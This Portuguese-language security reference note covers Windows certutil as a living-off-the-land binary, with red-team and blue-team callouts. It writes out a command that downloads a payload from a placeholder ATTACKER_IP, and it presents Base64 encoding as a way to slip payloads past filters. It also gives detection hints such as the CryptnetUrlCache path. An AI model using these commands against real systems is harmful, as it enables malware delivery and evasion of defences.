Ferramenta nativa do Windows para gerenciar certificados e o serviço de Certificate Services. Além do uso legítimo, é um **LOLBin** (living-off-the-land binary). Por ser assinada, confiável e presente por padrão, é usada para baixar arquivos e codificar/decodificar dados sem precisar de ferramentas externas.

# Usos

## Download de arquivo via HTTP

Baixa um arquivo hospedado num servidor HTTP para o disco local. Muito útil para transferir um binário (ex: um [[7. Payload|payload]]) do atacante para o alvo quando não há `curl`/`wget`:

```cmd
> certutil.exe -urlcache -split -f http://<ATTACKER_IP>/<binary> ./<binary>
```

- `-urlcache`: opera sobre o cache de URLs; combinado com uma URL faz o download.
- `-f`: força buscar da rede (ignora o cache).
- `-split`: grava o conteúdo baixado no arquivo de saída.

> [!redteam] Ingress tool transfer
> `certutil` é um dos meios clássicos de trazer ferramentas para dentro do alvo (MITRE ATT&CK T1105), já que roda em qualquer Windows e é assinado pela Microsoft. Combina bem com um servidor HTTP simples do lado do atacante (ex: `python3 -m http.server`) hospedando o binário.

> [!blueteam] Uso suspeito e monitorado
> `certutil` baixando de URLs é um forte indicador de atividade maliciosa e é amplamente monitorado por EDRs. A linha de comando `-urlcache` com endereços externos costuma disparar alertas.
> 
> Um cache é criado em `%LOCALAPPDATA%Low\Microsoft\CryptnetUrlCache\Content` (`C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content` se executado como `NT AUTHORITY\SYSTEM`) para salvar o conteúdo do que supostamente deveria ser um certificado. Esse cache pode ser monitorado.

## Base64 encode / decode

Codifica e decodifica arquivos em Base64. Usado para transferir payloads como texto, contornando filtros:

```cmd
> certutil -encode input.bin output.b64   # codifica
> certutil -decode output.b64 input.bin   # decodifica
```

## Calcular hash de arquivo

```cmd
> certutil -hashfile <arquivo> SHA256
# algoritmos: MD5, SHA1, SHA256...
```
